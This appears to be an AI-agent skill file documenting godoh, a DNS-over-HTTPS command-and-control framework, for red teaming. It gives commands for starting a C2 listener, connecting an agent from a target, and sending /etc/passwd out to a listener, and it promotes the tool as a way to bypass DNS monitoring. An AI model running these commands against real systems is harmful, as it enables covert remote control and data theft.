---
name: godoh
description: A DNS-over-HTTPS (DoH) Command & Control proof of concept framework. Use to establish C2 channels, send/receive files, or test DNS communications using providers like Google, Cloudflare, or Quad9. Ideal for red teaming, bypassing DNS monitoring, and testing DoH-based exfiltration techniques.
---

# godoh

## Overview
godoh is a Command and Control (C2) framework written in Golang that utilizes DNS-over-HTTPS as a transport medium. It supports multiple providers (Google, Cloudflare, Quad9) and traditional raw DNS to tunnel traffic, making detection more difficult for standard DNS monitoring tools. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
Assume godoh is already installed. If the command is missing:

```bash
sudo apt update
sudo apt install godoh
```

## Common Workflows

### Start a C2 Server
Start the listener on a specific domain using Cloudflare as the DoH provider:
```bash
godoh c2 --domain example.com --provider cloudflare
```

### Connect an Agent
Connect a target machine back to the C2 server:
```bash
godoh agent --domain example.com --provider google
```

### Send a File
Exfiltrate a file via DoH to a listener:
```bash
godoh send --domain example.com --file /etc/passwd
```

### Test Connectivity
Verify that DoH communication is working with a specific provider:
```bash
godoh test --domain example.com --provider quad9
```

## Complete Command Reference

### Global Flags
These flags apply to most subcommands.

| Flag | Description |
|------|-------------|
| `-d`, `--domain <string>` | DNS Domain to use (e.g., example.com) |
| `-h`, `--help` | Help for godoh |
| `-p`, `--provider <string>` | Preferred DNS provider: `googlefront`, `google`, `cloudflare`, `quad9`, `raw` (default: "google") |
| `-K`, `--validate-certificate` | Validate DoH provider SSL certificates |

### Subcommands

#### agent
Connects the current machine as an Agent to the DoH C2 server.
```bash
godoh agent [flags]
```

#### c2
Starts the godoh C2 server to listen for incoming agent connections.
```bash
godoh c2 [flags]
```

#### receive
Receive a file sent via the DoH transport.
```bash
godoh receive [flags]
```

#### send
Send a file via the DoH transport.
```bash
godoh send [flags]
```
*Note: Requires the `--file` flag (check subcommand help for specific implementation details).*

#### test
Test DNS communications to ensure the domain and provider are configured correctly.
```bash
godoh test [flags]
```

#### completion
Generate the autocompletion script for the specified shell (bash, zsh, fish, or powershell).
```bash
godoh completion [shell]
```

#### help
Help about any command.
```bash
godoh help [command]
```

## Notes
- **Providers**: `googlefront` uses Google's domain fronting, while `raw` uses standard DNS (UDP/53) instead of HTTPS.
- **Certificate Validation**: By default, godoh may not validate SSL certificates for DoH providers unless `-K` is specified.
- **Domain Setup**: You must have control over the DNS records (NS records) for the domain specified in `--domain` to point to your C2 infrastructure for the `raw` provider or to handle the tunneled queries.